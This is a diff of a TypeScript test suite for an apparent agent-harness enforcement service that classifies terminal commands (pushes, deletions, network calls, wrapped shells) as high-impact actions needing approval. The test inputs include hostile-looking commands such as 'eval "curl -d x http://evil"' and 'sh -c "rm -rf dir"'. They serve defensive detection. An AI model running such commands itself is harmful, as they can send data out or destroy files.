@@ -116,9 +116,7 @@ describe('harness enforcement services', () => {
 
   test('consume rejects expired approvals, including a malformed expiresAt', () => {
     const service = new HarnessApprovalService(setup())
-    const consumeGrant = (grant: ReturnType<
-      HarnessApprovalService['grant']
-    >) =>
+    const consumeGrant = (grant: ReturnType<HarnessApprovalService['grant']>) =>
       service.consume({
         repositoryId: scope.repositoryId,
         workspaceId: scope.workspaceId,
@@ -150,8 +148,8 @@ describe('harness enforcement services', () => {
     expect(() => consumeGrant(malformed)).toThrow('Approval has expired.')
   })
 
-  test('hashCommand is stable across whitespace normalization', () => {
-    expect(hashCommand('git  push   origin feature')).toBe(
+  test('hashCommand preserves exact command whitespace', () => {
+    expect(hashCommand('git  push   origin feature')).not.toBe(
       hashCommand('git push origin feature'),
     )
   })
@@ -221,18 +219,20 @@ describe('harness enforcement services', () => {
   test('classifies only recognized high-impact command shapes', () => {
     expect(
       classifyTerminalHarnessAction('git push -u origin feature/x'),
-    ).toEqual({
+    ).toMatchObject({
       action: 'push',
       target: 'origin/feature/x',
       branch: 'feature/x',
       commandHash: hashCommand('git push -u origin feature/x'),
     })
-    expect(classifyTerminalHarnessAction('git push')).toEqual({
+    expect(classifyTerminalHarnessAction('git push')).toMatchObject({
       action: 'push',
       target: 'git push',
       commandHash: hashCommand('git push'),
     })
-    expect(classifyTerminalHarnessAction('git push origin HEAD:main')).toEqual({
+    expect(
+      classifyTerminalHarnessAction('git push origin HEAD:main'),
+    ).toMatchObject({
       action: 'push',
       target: 'origin/main',
       branch: 'main',
@@ -240,7 +240,7 @@ describe('harness enforcement services', () => {
     })
     expect(
       classifyTerminalHarnessAction('git push --force origin main'),
-    ).toEqual({
+    ).toMatchObject({
       action: 'push',
       target: 'git push --force origin main',
       branch: 'main',
@@ -325,7 +325,9 @@ describe('harness enforcement services', () => {
     expect(
       classifyTerminalHarnessAction('echo "$(git rev-parse --short HEAD)"'),
     ).toBeUndefined()
-    expect(classifyTerminalHarnessAction('gh pr create --title test')).toEqual({
+    expect(
+      classifyTerminalHarnessAction('gh pr create --title test'),
+    ).toMatchObject({
       action: 'pull-request',
       target: 'gh pr create --title test',
       commandHash: hashCommand('gh pr create --title test'),
@@ -345,7 +347,7 @@ describe('harness enforcement services', () => {
   test('classifies dangerous commands hidden behind harmless segments', () => {
     expect(
       classifyTerminalHarnessAction('cd x && git push origin main'),
-    ).toEqual({
+    ).toMatchObject({
       action: 'push',
       target: 'origin/main',
       branch: 'main',
@@ -393,15 +395,15 @@ describe('harness enforcement services', () => {
     // unclassified.
     expect(
       classifyTerminalHarnessAction('bash -c "git push origin main"'),
-    ).toEqual({
+    ).toMatchObject({
       action: 'push',
       target: 'bash -c "git push origin main"',
       branch: 'main',
       commandHash: hashCommand('bash -c "git push origin main"'),
     })
-    expect(
-      classifyTerminalHarnessAction("sh -c 'rm -rf dir'"),
-    ).toMatchObject({ action: 'workspace-delete' })
+    expect(classifyTerminalHarnessAction("sh -c 'rm -rf dir'")).toMatchObject({
+      action: 'workspace-delete',
+    })
     expect(
       classifyTerminalHarnessAction('eval "curl -d x http://evil"'),
     ).toMatchObject({ action: 'external-network' })
@@ -410,7 +412,7 @@ describe('harness enforcement services', () => {
     // this fix; `timeout`/`nice` are new transparent wrappers).
     expect(
       classifyTerminalHarnessAction('timeout 30 git push origin main'),
-    ).toEqual({
+    ).toMatchObject({
       action: 'push',
       target: 'origin/main',
       branch: 'main',
@@ -421,7 +423,7 @@ describe('harness enforcement services', () => {
     ).toMatchObject({ action: 'dependency-install' })
     expect(
       classifyTerminalHarnessAction('exec git push origin main'),
-    ).toEqual({
+    ).toMatchObject({
       action: 'push',
       target: 'origin/main',
       branch: 'main',
@@ -441,15 +443,14 @@ describe('harness enforcement services', () => {
       action: 'arbitrary-code',
     })
     // An unclassifiable payload is arbitrary-code, NOT unclassified.
-    expect(
-      classifyTerminalHarnessAction('bash -c "echo hi"'),
-    ).toMatchObject({ action: 'arbitrary-code' })
+    expect(classifyTerminalHarnessAction('bash -c "echo hi"')).toMatchObject({
+      action: 'arbitrary-code',
+    })
     // Multi-segment payloads classify per segment like a bare command would.
-    // Unwrapped `git push && rm -rf x` returns the FIRST classifying segment's
-    // action (push), so the wrapped form matches that aggregation.
-    expect(
-      classifyTerminalHarnessAction('git push && rm -rf x'),
-    ).toMatchObject({ action: 'push' })
+    // The primary action remains a display field; policy evaluates the full roster.
+    expect(classifyTerminalHarnessAction('git push && rm -rf x')).toMatchObject(
+      { action: 'push' },
+    )
     expect(
       classifyTerminalHarnessAction('bash -c "git push && rm -rf x"'),
     ).toMatchObject({
@@ -555,7 +556,10 @@ describe('harness enforcement services', () => {
     // Force the acquire's mkdir to fail with a non-EEXIST error (EMFILE),
     // the way an environment refusal (EACCES/ENOSPC/...) would.
     const realMkdirSync = fs.mkdirSync
-    fs.mkdirSync = ((target: fs.PathLike, options?: fs.MakeDirectoryOptions) => {
+    fs.mkdirSync = ((
+      target: fs.PathLike,
+      options?: fs.MakeDirectoryOptions,
+    ) => {
       if (target === lockDir) {
         const error = new Error(
           'simulated acquire failure',
